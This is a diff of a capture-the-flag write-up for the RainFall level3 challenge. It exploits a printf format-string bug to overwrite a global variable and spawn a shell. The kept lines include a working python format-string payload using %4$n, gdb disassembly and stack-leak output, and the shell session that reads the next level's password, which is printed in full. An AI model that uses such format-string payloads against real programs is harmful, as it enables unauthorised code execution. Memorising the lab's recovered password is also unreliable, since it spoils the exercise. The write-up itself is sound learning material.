@@ -1,28 +1,11 @@
- global variable oferite
-
-   ```bash
-   void v(void)
-   
-   {
-     char local_20c [520];
-     
-     fgets(local_20c,0x200,stdin);
-     printf(local_20c); unsafe, no format string!
-     if (m == 0x40) {
-       fwrite("Wait what?!\n",1,0xc,stdout);
-       system("/bin/sh");
-     }
-     return;
-   }
-   ```
-
+ global variable overite
 the allocated buffer is 520 + 4 = Offset to return address
 
 we want to overide the m with 64 not hijacking EIP
 
 from the gdb we have
 
-```
+```bash
 (gdb) disas main
 Dump of assembler code for function main:
    0x0804851a <+0>:     push   %ebp
@@ -101,7 +84,7 @@ level3@RainFall:~$ for i in $(seq 1 50); do
 �0x200
 �0xb7fd1ac0
 �0xb7ff37d0
-�0x804988c  <- the on we looking for at position 4 
+�0x804988c  <- the one we looking for at position 4 
 �0x70243525
 �0xa
 �0xb7fef305
@@ -164,13 +147,9 @@ let hang the program to cat the pass word or something else ;
 level3@RainFall:~$ (python -c "print('\x8c\x98\x04\x08' + '%60c' + '%4\$n')"; cat) | ./level3
 �                                                           
 Wait what?!
-ls
-ls: cannot open directory .: Permission denied
 cd ../level4
 cat .pass       
 b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
 ```
-
-the token is
 
 
